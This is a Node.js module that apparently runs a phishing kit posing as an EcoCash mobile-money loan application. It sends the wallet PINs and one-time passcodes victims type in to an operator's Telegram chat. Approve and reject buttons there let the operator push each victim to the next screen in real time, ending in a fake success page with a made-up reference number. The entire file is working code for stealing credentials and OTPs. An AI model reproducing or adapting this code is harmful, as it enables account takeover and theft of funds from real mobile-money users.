require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// Initialize bot without polling (Render uses webhooks)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

const botManager = {
    bot: bot,

    sendToAdmin: (appId, title, data, needsApproval = false) => {
        let msg = `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
        for (const [k, v] of Object.entries(data)) {
            msg += `<b>${k}:</b> <code>${v}</code>\n`;
        }

        const options = { parse_mode: 'HTML' };
        if (needsApproval) {
            options.reply_markup = {
                inline_keyboard: [[
                    // Moves user directly to OTP validation screen in index.html
                    { text: "✅ APPROVE (Move to OTP)", callback_data: `approve_4_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_4_${appId}` }
                ]]
            };
        }
        bot.sendMessage(ADMIN_ID, msg, options);
    },

    sendFinalApproval: (appId, pin) => {
        const msg = `🏁 <b>🇿🇼 FINAL OTP RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 OTP: <code>${pin}</code>`;
        bot.sendMessage(ADMIN_ID, msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
                    { text: "❌ REJECT OTP", callback_data: `reject_5_${appId}` }
                ]]
            }
        });
    }
};

// Handle Admin Button Clicks
bot.on("callback_query", (query) => {
    const dataParts = query.data.split("_");
    const action = dataParts[0]; // "approve" or "reject"
    const step = dataParts[1];   // "4" or "5"
    const appId = dataParts[2];  // Unique alphanumeric reference ID
    
    const io = global.io;

    if (action === "approve") {
        if (step === "4") {
            // Signal index.html to move to Step 5 (OTP input)
            io.to(appId).emit('password-verified');
            bot.answerCallbackQuery(query.id, { text: "OTP input shown to user" });
        } 
        else if (step === "5") {
            // Signal index.html to show final success screen automatically
            const ref = "ZIM-" + Math.floor(Math.random() * 900000 + 100000);
            io.to(appId).emit('pin-verified', { referenceId: ref });
            bot.answerCallbackQuery(query.id, { text: "ECO CASH Application Completed!" });
        }
        
        bot.editMessageText(query.message.text + "\n\n✅ <b>ACTION: APPROVED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }

    if (action === "reject") {
        if (step === "4") {
            // Rejects the initial MoMo Wallet PIN code entry
            io.to(appId).emit('password-rejected', { message: "PIN code verification failed. Please try again." });
            bot.answerCallbackQuery(query.id, { text: "Wallet PIN Rejected" });
        } 
        else if (step === "5") {
            // Rejects the automated 6-digit OTP code input block
            io.to(appId).emit('pin-rejected', { message: "The 6-digit verification code is invalid or expired." });
            bot.answerCallbackQuery(query.id, { text: "OTP Token Rejected" });
        }
        
        bot.editMessageText(query.message.text + "\n\n❌ <b>ACTION: REJECTED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }
});

module.exports = botManager;